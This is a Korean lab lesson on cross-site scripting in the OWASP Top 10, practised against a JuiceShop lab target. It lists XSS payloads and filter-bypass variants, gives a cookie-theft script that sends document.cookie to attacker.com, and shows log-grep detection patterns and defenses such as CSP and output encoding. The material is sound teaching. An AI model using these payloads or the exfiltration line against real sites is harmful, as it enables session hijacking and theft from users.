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OWASP Top 10 (2) - XSS (Cross-Site Scripting)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XSS(Cross-Site Scripting)의 개념과 위험성을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Reflected, Stored, DOM-based XSS의 차이를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실제 XSS 공격을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XSS 방어 기법(출력 인코딩, CSP)을 이해한다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실습 환경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 | 10.20.30.201 | 실습 기지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web | 10.20.30.80 | JuiceShop:3000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XSS란?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쿠키/세션 토큰 탈취 → 다른 사용자의 계정으로 로그인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키 입력 기록 → 비밀번호, 신용카드 번호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페이지 내용 변조 → 가짜 로그인 폼 표시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대상 | 서버(데이터베이스) | 클라이언트(브라우저)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삽입 코드 | SQL 구문 | JavaScript 코드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실행 위치 | 서버의 DB 엔진 | 피해자의 브라우저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피해 | 데이터 유출/변조 | 세션 탈취, 페이지 변조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XSS 유형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악성 URL을 만듦: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피해자가 이 링크를 클릭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서버가 검색 결과 페이지를 반환하면서 입력을 그대로 포함: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공격자가 악성 URL을 만듦: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http://target.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;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피해자가 이 링크를 클릭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서버가 검색 결과 페이지를 반환하면서 입력을 그대로 포함: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"검색어: &lt;script&gt;alert('XSS')&lt;/script&gt;에 대한 결과"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피해자 브라우저에서 JavaScript 실행!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JuiceShop XSS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검색 API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"http://10.20.30.80:3000/rest/products/search?q=apple"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python3 -m json.tool | head -15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XSS 페이로드 모음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기본 alert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&lt;script&gt;alert('XSS')&lt;/script&gt;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img 태그의 onerror 이벤트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&lt;img src=x onerror=alert('XSS')&gt;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iframe으로 JavaScript 실행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&lt;iframe src="javascript:alert('XSS')"&gt;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SVG 태그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&lt;svg onload=alert('XSS')&gt;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body 태그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&lt;body onload=alert('XSS')&gt;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쿠키 탈취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XSS가 있는 페이지에 삽입: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피해자가 해당 페이지를 방문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피해자의 브라우저가 쿠키를 공격자 서버로 전송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공격자가 XSS가 있는 페이지에 삽입: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&lt;script&gt;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new Image().src = "http://attacker.com/steal?cookie=" + document.cookie;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&lt;/script&gt;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피해자가 해당 페이지를 방문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피해자의 브라우저가 쿠키를 공격자 서버로 전송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공격자가 탈취한 쿠키로 피해자의 세션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XSS 방어 기법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기본적으로 같은 출처('self')의 리소스만 허용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스크립트는 같은 출처와 cdn.example.com에서만 로드 가능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인라인 스크립트(`&lt;script&gt;alert(1)&lt;/script&gt;`) 차단!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취약한 코드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&lt;p&gt;검색어: 사용자입력&lt;/p&gt;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만약 사용자입력이 &lt;script&gt;alert(1)&lt;/script&gt;이면 스크립트 실행됨!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안전한 코드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&lt;p&gt;검색어: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/p&gt;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브라우저에 텍스트로 표시됨, 실행되지 않음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XSS와 SIEM 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web 서버의 Apache 접근 로그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cat /var/log/apache2/access.log | grep -i 'script\|alert\|onerror' | tail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JuiceShop 로그에서 XSS 시도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"sudo docker logs juiceshop 2&gt;&amp;1 | grep -i 'script\|xss' | tail -5"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OpsClaw로 XSS 테스트 자동화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XSS 테스트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PROJECT_ID=$(curl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'{"name":"week05-xss-test","request_text":"JuiceShop XSS 취약점 점검","master_mode":"external"}'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| python3 -c "import sys,json;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Stage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http://localhost:8000/projects/$PROJECT_ID/plan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&gt; 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실습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JuiceShop 검색에서 DOM XSS 페이로드 테스트 (`&lt;iframe src="javascript:alert('xss')"&gt;`)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주문 추적에서 Reflected XSS 테스트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피드백 API에 Stored XSS 페이로드 제출 시도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쿠키 탈취 시뮬레이션 수행 (간이 서버 + curl)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JuiceShop의 CSP 및 보안 헤더 현황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다양한 XSS 페이로드(img, svg, iframe)로 필터 우회 시도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JuiceShop에서 최소 1개의 XSS 챌린지를 성공시키고, 사용한 페이로드와 과정을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`&lt;script&gt;alert(1)&lt;/script&gt;`이 필터링될 때, 이를 우회할 수 있는 대체 페이로드 3개를 제시하라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CSP(Content-Security-Policy) 헤더가 설정되어 있을 때 XSS 공격이 왜 어려워지는지 설명하라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Stored XSS가 Reflected XSS보다 더 위험한 이유를 실제 시나리오와 함께 설명하라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XSS는 악성 JavaScript를 웹 페이지에 삽입하여 피해자의 브라우저에서 실행시키는 공격이다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Reflected XSS: URL에 포함, 피해자가 클릭해야 동작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Stored XSS: DB에 저장, 페이지를 보는 모든 사용자에게 영향 (더 위험)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DOM-based XSS: 서버를 거치지 않고 클라이언트 측 JavaScript에서 발생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방어: 출력 인코딩, CSP, HttpOnly 쿠키, 입력 새니타이징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